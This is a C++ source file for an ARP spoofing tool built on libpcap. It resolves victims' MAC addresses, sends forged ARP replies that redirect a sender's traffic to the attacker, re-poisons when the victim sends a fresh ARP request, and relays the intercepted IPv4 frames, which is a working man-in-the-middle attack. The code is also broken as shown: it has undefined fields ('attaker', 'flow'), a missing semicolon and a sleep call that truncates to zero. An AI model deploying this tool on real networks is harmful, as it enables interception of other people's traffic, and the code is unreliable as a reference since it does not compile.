#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <unistd.h>
#include <string.h>
#include <cstdio>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sstream>
#include <stdlib.h>
#include <iomanip>
#include <vector>
#include <iostream>
#include <pthread.h>
#include <signal.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct edge
{
	Ip ip;
	Mac mac;
}Edge;


typedef struct thread_args
{
	pcap_t* handle;
	Edge sender;
	Edge target;
	Edge attacker;
}Args;

Args* args;
int arg_size;
pthread_t* threads;

void usage()
{
	printf("usage");
	return;
}

void cleanup_handler(void* arg)
{
	//idk how to handle this
	printf("stopping thread...\n");
}

void sigint_handler(int sig)
{
	//preventing malloc cat
	printf("SIGINT - stopping...\n");
	for(int i = 0; i < arg_size; i++)
	{
		pcap_close((args + i) -> handle);
	}
	free(args);

	for (int i = 0; i < arg_size; i++) 
	{
		pthread_cancel(threads[i]);
	}

	for (int i = 0; i < arg_size; i++)
	{
		pthread_join(threads[i], NULL);
	}
	free(threads);
	exit(0);
}

int get_my_ip(char* interface, char* ip)
{
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }
	memcpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	strcpy(ip, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
	return 0;
}

int Target_resolve(pcap_t* handle, Edge* sender, Edge* attacker)
{
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac::broadcastMac();
	packet.eth_.smac_ = attacker -> mac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = attacker -> mac;
	packet.arp_.sip_ = htonl(attacker -> ip);
	packet.arp_.tmac_ = Mac::nullMac();
	packet.arp_.tip_ = htonl(sender -> ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return 1;
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* recv_packet;
		int res = pcap_next_ex(handle, &header, &recv_packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return 1;
		}
		struct EthArpPacket *conv_packet = (struct EthArpPacket *)recv_packet;
		if(conv_packet->arp_.op() == ArpHdr::Reply && conv_packet->eth_.type() == EthHdr::Arp){
			if(conv_packet->arp_.sip() == sender -> ip && conv_packet->arp_.tmac() == attacker -> mac){
				sender -> mac = conv_packet -> arp_.smac();
				printf("MAC resolved - %s to %s\n", std::string(sender -> ip).c_str(), std::string(sender -> mac).c_str());
				return 0;
			}
		}
	}
}

int Arp_attack(pcap_t* handle, Args* args)
{
	EthArpPacket send_packet;
	send_packet.eth_.dmac_ = args -> sender.mac;
	send_packet.eth_.smac_ = args -> attacker.mac;
	send_packet.eth_.type_ = htons(EthHdr::Arp);
	send_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	send_packet.arp_.pro_ = htons(EthHdr::Ip4);
	send_packet.arp_.hln_ = Mac::SIZE;
	send_packet.arp_.pln_ = Ip::SIZE;
	send_packet.arp_.op_ = htons(ArpHdr::Reply);
	send_packet.arp_.smac_ = args -> attaker.mac;
	send_packet.arp_.sip_ = htonl(args -> target.ip);
	send_packet.arp_.tmac_ = args -> sender.mac;
	send_packet.arp_.tip_ = htonl(args -> sender.ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&send_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return 1;
	}
	printf("Arp_attack success - %s\n", std::string(args -> sender.ip).c_str());
	return 0;
}

int packet_relaying(pcap_t* handle, Args * args)
{
	struct pcap_pkthdr* header;
	const u_char* recv_packet;
	u_char relay_packet[1515];
	int res;
	int ctr = 1;

	while (1) {
		res = pcap_next_ex(handle, &header, &recv_packet);
		if (res == 0)
			continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				return 1;
		}
		uint packet_size = header -> caplen;

		struct EthArpPacket *conv_packet = (struct EthArpPacket *)recv_packet;

		if(conv_packet -> eth_.smac() != args -> sender.mac)
			continue;

		if(conv_packet->eth_.type() == EthHdr::Arp)
		{
			if(conv_packet -> arp_.sip() == args -> sender.ip && conv_packet -> arp_.tip() == args -> target.ip)
			{
				if(conv_packet -> eth_.dmac().isBroadcast())
				{
					printf("Attacking again\n");
					sleep(0.2);
					Arp_attack(handle, args);
				}
			}
		}
		else	//relay
		{
			if(conv_packet->eth_.type() != EthHdr::Ip4)
				continue;

			if(conv_packet->eth_.smac() == flow -> sender.mac)
			{
				conv_packet->eth_.smac_ = conv_packet->eth_.dmac();
				conv_packet->eth_.dmac_ = flow -> target.mac;
			}
			else
			{
				continue;
			}
			
			std::cout << "packet_relaying(" << ctr << ") : " << std::string(flow -> sender.mac) << " to " << std::string(conv_packet->eth_.dmac()) << std::endl;
			ctr++;
			if(packet_size > 1514)
			{
				std::cout << "packet is too big and beautiful1ll" << std::endl;
				continue;
			}

			memcpy(relay_packet, recv_packet, packet_size);
			memcpy(relay_packet, conv_packet, 14);

			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(relay_packet), packet_size);
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				return 1;
			}
		}
	}
}

void* threader(void* args)
{
	Args* trans_arg = (Args*)args;
	pcap_t* handle = trans_arg -> handle;
	Edge* sender = &(trans_arg -> sender)
	Edge* target = &(trans_arg -> target);
	Edge* attacker = &(trans_arg -> attacker);
	pthread_cleanup_push(cleanup_handler, NULL);
	if(Target_resolve(handle, sender, attacker) != 0 || Target_resolve(handle, target, attacker) != 0)
	{
		printf("Target_resolve fail\n");
		pthread_exit((void*)1);
	}
	if(Arp_attack(handle, trans_arg) != 0)
	{
		printf("Arp_attack fail\n");
		pthread_exit((void*)1);
	}
	if(packet_relaying(handle, trans_arg) != 0)
	{
		printf("packet_relaying fail\n");
		pthread_exit((void*)1);
	}
	pthread_cleanup_pop(0);
	pthread_exit(NULL);
}


int main(int argc, char* argv[])
{
	if (argc < 4 || argc % 2 != 0)
	{
		usage();
		return -1;
	}
	int pair_size = argc / 2 - 1;
	arg_size = pair_size;
	int err_no;
	signal(SIGINT, sigint_handler);
	args = (Args*)malloc(pair_size * sizeof(Args));
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	char my_ip[16];
	threads = (pthread_t*)malloc(pair_size * sizeof(pthread_t));
	get_my_ip(dev, my_ip);
	std::ifstream iface("/sys/class/net/" + std::string(dev) + "/address");
  	std::string my_mac((std::istreambuf_iterator<char>(iface)), std::istreambuf_iterator<char>());

	printf("Myip : %s\n", my_ip);
	printf("MyMac : %s\n", my_mac.c_str());
	for(int i = 0; i < pair_size; i++)
	{
		(args + i) -> attacker.ip = Ip(std::string(my_ip));
		(args + i) -> attacker.mac = Mac(my_mac);
		(args + i) -> handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		(args + i) -> flow.sender.ip = Ip(argv[i * 2 + 2]);
		(args + i) -> flow.target.ip = Ip(argv[i * 2 + 3]);
		if ((args + i) -> handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}
		if(pthread_create(&threads[i], NULL, threader, (void*)(args + i)) != 0)
		{
			printf("pthread_create error\n");
		}
	}
	for (int i = 0; i < arg_size; i++)
	{
		pthread_join(threads[i], NULL);
	}
	return 0;
}